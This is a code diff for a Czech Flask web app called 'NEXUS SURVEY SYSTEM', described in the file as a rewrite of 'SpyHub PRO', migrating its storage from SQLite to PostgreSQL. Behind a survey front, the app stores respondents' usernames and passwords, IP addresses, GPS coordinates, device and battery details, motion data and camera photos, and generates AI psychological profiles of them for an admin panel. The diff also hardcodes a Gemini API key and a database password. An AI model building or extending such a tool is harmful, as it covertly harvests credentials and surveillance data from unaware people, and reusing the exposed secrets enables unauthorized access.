@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-NEXUS SURVEY SYSTEM v2.0
-Moderní přepis SpyHub PRO - připraveno pro Endoru a Render
+NEXUS SURVEY SYSTEM v3.0 (PostgreSQL Edition)
+Moderní přepis SpyHub PRO - připraveno pro Endoru a Render (Trvalá databáze)
 """
 import os, json, time, base64, logging, sqlite3, urllib.request, ssl
 from urllib.error import HTTPError
@@ -40,14 +40,23 @@ try:
 except ImportError:
     UA_SUPPORT = False
 
+try:
+    import psycopg2
+    import psycopg2.extras
+except ImportError:
+    print("ERROR: pip install psycopg2-binary")
+    exit()
+
 # --- CONFIG ---
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "spy")
 UPLOAD_FOLDER = 'fotky_od_uzivatelu'
-DATABASE = 'data.db'
 CONFIG_FILE = 'config.json'
 PORT = int(os.environ.get("PORT", 5055))
 CLAUDE_API_KEY = os.environ.get("CLAUDE_API_KEY", "")
 GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "AIzaSyCLnC2cjqEpRThJHevnz9zt-iyzbga1bZU")
+
+# TVOJE POSTGRESQL DATABÁZE (Trvalé úložiště)
+DATABASE_URL = os.environ.get("DATABASE_URL", "postgresql://nexus_db_85j3_user:zyhZ0BfUb2XG9Z7cT2Mep7qGvAWztCVi@dpg-d795vs3uibrs73c34iv0-a/nexus_db_85j3")
 
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
 
@@ -58,7 +67,6 @@ app.secret_key = os.environ.get("SECRET_KEY", b'nexus_survey_secret_2025_v2')
 
 if not os.path.exists(UPLOAD_FOLDER): os.makedirs(UPLOAD_FOLDER)
 
-# AKTUALIZOVANÁ DEFAULTNÍ KONFIGURACE (dle staré DB)
 DEFAULT_CONFIG = {
     "login_enabled": True,
     "survey_title": "NEXUS SURVEY",
@@ -81,11 +89,30 @@ DEFAULT_CONFIG = {
 
 active_users_cache = {}
 
+class DBWrapper:
+    """Wrapper pro sjednocení syntaxe PostgreSQL s původním kódem"""
+    def __init__(self, conn):
+        self.conn = conn
+
+    def execute(self, query, params=None):
+        cur = self.conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
+        if params:
+            cur.execute(query, params)
+        else:
+            cur.execute(query)
+        return cur
+
+    def commit(self):
+        self.conn.commit()
+
+    def close(self):
+        self.conn.close()
+
 def get_db():
     db = getattr(g, '_database', None)
     if db is None:
-        db = g._database = sqlite3.connect(DATABASE)
-        db.row_factory = sqlite3.Row
+        conn = psycopg2.connect(DATABASE_URL)
+        db = g._database = DBWrapper(conn)
     return db
 
 @app.teardown_appcontext
@@ -97,17 +124,15 @@ def init_db(app):
     with app.app_context():
         db = get_db()
         db.execute('''CREATE TABLE IF NOT EXISTS visits (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            id SERIAL PRIMARY KEY,
             username TEXT, password TEXT,
             ip TEXT, local_ip TEXT, city TEXT,
             lat REAL, lon REAL,
             device TEXT, battery TEXT, cam_photo TEXT,
             quiz_data TEXT, timing_data TEXT, motion_data TEXT,
             ai_profile TEXT, start_time TEXT,
+            is_partial INTEGER DEFAULT 0,
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
-        for col in ["ai_profile TEXT", "local_ip TEXT", "is_partial INTEGER DEFAULT 0"]:
-            try: db.execute("ALTER TABLE visits ADD COLUMN " + col)
-            except: pass
         db.commit()
 
 def load_config():
@@ -847,7 +872,7 @@ select.fld{cursor:pointer}
       <div class="settings-section">
         <div class="settings-head">Záloha a Databáze</div>
         
-        <button class="btn accent full" style="margin-bottom:12px" onclick="document.getElementById('import-file').click()">📥 Importovat zálohu (data.db)</button>
+        <button class="btn accent full" style="margin-bottom:12px" onclick="document.getElementById('import-file').click()">📥 Importovat starou SQLite zálohu (data.db)</button>
         <input type="file" id="import-file" style="display:none" accept=".db,.sqlite" onchange="uploadDB(this)">
         
         <button class="btn danger full" style="margin-bottom:8px" onclick="cleanGhosts()">🧹 Vymazat duchy (prázdné záznamy)</button>
@@ -883,7 +908,7 @@ select.fld{cursor:pointer}
     <div class="modal-body" style="padding:0">
       <div class="chat-wrap">
         <div class="chat-msgs" id="chat-msgs">
-          <div class="chat-msg ai">👋 Ahoj! Jsem tvůj AI asistent. Analyzuji data průzkumu. Zeptej se mě na cokoliv – trendy, vzorce, statistiky nebo konkrétní respondenty.</div>
+          <div class="chat-msg ai">👋 Ahoj! Jsem tvůj AI asistent. Analyzuji data průzkumu z tvé PostgreSQL databáze. Zeptej se mě na cokoliv – trendy, vzorce, statistiky nebo konkrétní respondenty.</div>
         </div>
         <div class="chat-input-row" style="padding:12px 16px">
           <input class="chat-input" id="chat-in" placeholder="Napiš otázku..." onkeydown="if(event.key==='Enter')sendChat()">
@@ -1230,10 +1255,10 @@ function openModal(id){document.getElementById(id).classList.add('open')}
 function closeModal(id){document.getElementById(id).classList.remove('open')}
 document.querySelectorAll('.modal-overlay').forEach(m=>{m.addEventListener('click',e=>{if(e.target===m)m.classList.remove('open')})});
 
-// ── IMPORT DB ──
+// ── IMPORT STARÉ DATABÁZE ──
 function uploadDB(input) {
   if (!input.files || !input.files[0]) return;
-  if (!confirm("Chceš importovat data z tohoto souboru? Existující data nebudou smazána, nová data se přidají na konec.")) return;
+  if (!confirm("Chceš naimportovat data ze starého souboru do nové PostgreSQL databáze?")) return;
   
   let formData = new FormData();
   formData.append("db_file", input.files[0]);
@@ -1246,7 +1271,7 @@ function uploadDB(input) {
     location.reload();
   }).catch(e => alert("Chyba při nahrávání: " + e));
   
-  input.value = ""; // Reset inputu
+  input.value = "";
 }
 </script>
 </body>
@@ -1281,7 +1306,9 @@ def active_data():
         if now - active_users_cache[ip]['t'] > 6: del active_users_cache[ip]
     db = get_db()
     try:
-        count = db.execute("SELECT COUNT(id) FROM visits").fetchone()[0]
+        count_row = db.execute("SELECT COUNT(id) AS cnt FROM visits").fetchone()
+        count = count_row['cnt'] if count_row else 0
+        
         rows = db.execute("SELECT username, quiz_data, timing_data FROM visits ORDER BY id DESC").fetchall()
         t_tot, t_cnt, brands = 0, 0, []
         last_user = rows[0]['username'].split('|')[0].strip() if rows else "Nekdo"
@@ -1297,6 +1324,7 @@ def active_data():
         top_brand = max(set(brands), key=brands.count) if brands else "-"
         return jsonify({"users": [{"ip": i, "step": d['step'], "gyro": d['gyro']} for i,d in active_users_cache.items()], "db_len": count, "online_count": len(active_users_cache), "kpi_avg": avg_time, "kpi_brand": top_brand, "last_user": last_user})
     except Exception as e:
+        print("Error in active_data:", e)
         return jsonify({"db_len": 0, "online_count": len(active_users_cache), "kpi_avg": 0, "kpi_brand": "-", "last_user": ""})
 
 @app.route('/get_adaptive_question', methods=['POST'])
@@ -1316,12 +1344,13 @@ def get_adaptive_question():
 @app.route('/api/generate_profile/<int:uid>', methods=['POST'])
 def generate_profile(uid):
     db = get_db()
-    row = db.execute("SELECT quiz_data, battery, motion_data, timing_data FROM visits WHERE id=?", (uid,)).fetchone()
+    row = db.execute("SELECT quiz_data, battery, motion_data, timing_data FROM visits WHERE id=%s", (uid,)).fetchone()
     if not row or not HAS_AI: return jsonify({"error": "Chybi data nebo AI"})
     prompt = f"""Jsi expert na behavioralni psychologii. Analyzuj tato data zakaznice: {row['quiz_data']}. Vypracuj strucny psychologicky profil (max 3 vety). Pis vecne, analyticky, bez diakritiky."""
     profile = ask_ai(prompt)
     if profile:
-        db.execute("UPDATE visits SET ai_profile=? WHERE id=?", (profile, uid)); db.commit()
+        db.execute("UPDATE visits SET ai_profile=%s WHERE id=%s", (profile, uid))
+        db.commit()
         return jsonify({"profile": profile})
     return jsonify({"error": "Selhalo"})
 
@@ -1391,17 +1420,19 @@ def save_all():
         dev_info = d.get('device') or parse_device(request.headers.get('User-Agent', ''))
         
         c = db.execute('''INSERT INTO visits (username, password, ip, local_ip, city, lat, lon, device, battery, quiz_data, timing_data, motion_data, start_time)
-                          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)''',
+                          VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s) RETURNING id''',
                        (d.get('u','Anonym'), d.get('p',''), request.remote_addr, d.get('local_ip','N/A'), city, d.get('lat'), d.get('lon'),
                         dev_info, d.get('battery','N/A'), json.dumps(quiz,ensure_ascii=False), json.dumps(d.get('timing',{})), d.get('motion','N/A'), datetime.now().strftime("%H:%M | %d.%m.")))
-        vid = c.lastrowid
+        vid = c.fetchone()['id']
+        
         if d.get('photo'):
             try:
                 img = d['photo'].split(",")[1] if "," in d['photo'] else d['photo']
                 fname = f"cam_{vid}_{int(time.time())}.jpg"
                 with open(os.path.join(UPLOAD_FOLDER, fname), "wb") as f: f.write(base64.b64decode(img))
-                db.execute("UPDATE visits SET cam_photo=? WHERE id=?", (fname, vid))
+                db.execute("UPDATE visits SET cam_photo=%s WHERE id=%s", (fname, vid))
             except: pass
+            
         db.commit()
         return "OK", 200
     except Exception as e: 
@@ -1466,11 +1497,13 @@ def save_settings():
 def del_one(id):
     if not session.get('logged_in'): return "403"
     db = get_db()
-    r = db.execute("SELECT cam_photo FROM visits WHERE id=?", (id,)).fetchone()
+    r = db.execute("SELECT cam_photo FROM visits WHERE id=%s", (id,)).fetchone()
     if r and r['cam_photo']:
         try: os.remove(os.path.join(UPLOAD_FOLDER, r['cam_photo']))
         except: pass
-    db.execute("DELETE FROM visits WHERE id=?", (id,)); db.commit(); return "OK"
+    db.execute("DELETE FROM visits WHERE id=%s", (id,))
+    db.commit()
+    return "OK"
 
 @app.route('/del_multiple', methods=['POST'])
 def del_multiple():
@@ -1478,18 +1511,24 @@ def del_multiple():
     ids = request.json.get('ids', [])
     if ids:
         db = get_db()
-        db.execute(f"DELETE FROM visits WHERE id IN ({','.join(['?']*len(ids))})", ids); db.commit()
+        db.execute("DELETE FROM visits WHERE id = ANY(%s)", (ids,))
+        db.commit()
     return "OK"
 
 @app.route('/delete_ghosts', methods=['POST'])
 def delete_ghosts():
     if not session.get('logged_in'): return "403"
-    get_db().execute("DELETE FROM visits WHERE timing_data='{}' OR timing_data IS NULL OR timing_data='null'"); get_db().commit(); return "OK"
+    db = get_db()
+    db.execute("DELETE FROM visits WHERE timing_data='{}' OR timing_data IS NULL OR timing_data='null'")
+    db.commit()
+    return "OK"
 
 @app.route('/nuke_db', methods=['POST'])
 def nuke_db():
     if not session.get('logged_in'): return "403"
-    get_db().execute("DELETE FROM visits"); get_db().commit()
+    db = get_db()
+    db.execute("DELETE FROM visits")
+    db.commit()
     for f in os.listdir(UPLOAD_FOLDER):
         try: os.remove(os.path.join(UPLOAD_FOLDER, f))
         except: pass
@@ -1501,7 +1540,8 @@ def export_csv():
     import csv; from io import StringIO
     si = StringIO(); cw = csv.writer(si)
     cw.writerow(['ID','Uživatel','IP','Lokace','Zařízení','Baterie','Čas','Quiz Data'])
-    for r in get_db().execute("SELECT * FROM visits").fetchall():
+    db = get_db()
+    for r in db.execute("SELECT * FROM visits").fetchall():
         cw.writerow([r['id'],r['username'],r['ip'],r['city'],r['device'],r['battery'],r['created_at'],r['quiz_data']])
     o = make_response(si.getvalue())
     o.headers["Content-Disposition"] = "attachment; filename=nexus_export.csv"
@@ -1510,6 +1550,7 @@ def export_csv():
 
 @app.route('/import_db', methods=['POST'])
 def import_db():
+    """Tato funkce čte starou SQLite zálohu (data.db) a kopíruje ji do nového PostgreSQL"""
     if not session.get('logged_in'): return "403", 403
     file = request.files.get('db_file')
     if not file: return "Nebyl vybrán soubor", 400
@@ -1530,7 +1571,7 @@ def import_db():
                 INSERT INTO visits (
                     username, password, ip, local_ip, city, lat, lon, device, battery, 
                     cam_photo, quiz_data, timing_data, motion_data, ai_profile, start_time, created_at, is_partial
-                ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+                ) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)
             ''', (
                 r.get('username'), r.get('password'), r.get('ip'), r.get('local_ip'),
                 r.get('city'), r.get('lat'), r.get('lon'), r.get('device'),
@@ -1552,7 +1593,7 @@ if __name__ == '__main__':
     init_db(app)
     ai_status = "Claude" if CLAUDE_API_KEY else ("Gemini" if GEMINI_API_KEY else "BEZ AI")
     print(f"╔══════════════════════════════════════╗")
-    print(f"║   NEXUS SURVEY SYSTEM v2.0           ║")
+    print(f"║   NEXUS SURVEY SYSTEM v3.0 (PSQL)    ║")
     print(f"║   Port: {PORT:<28} ║")
     print(f"║   AI: {ai_status:<30} ║")
     print(f"║   Admin: /admin  Heslo: {ADMIN_PASSWORD:<12} ║")
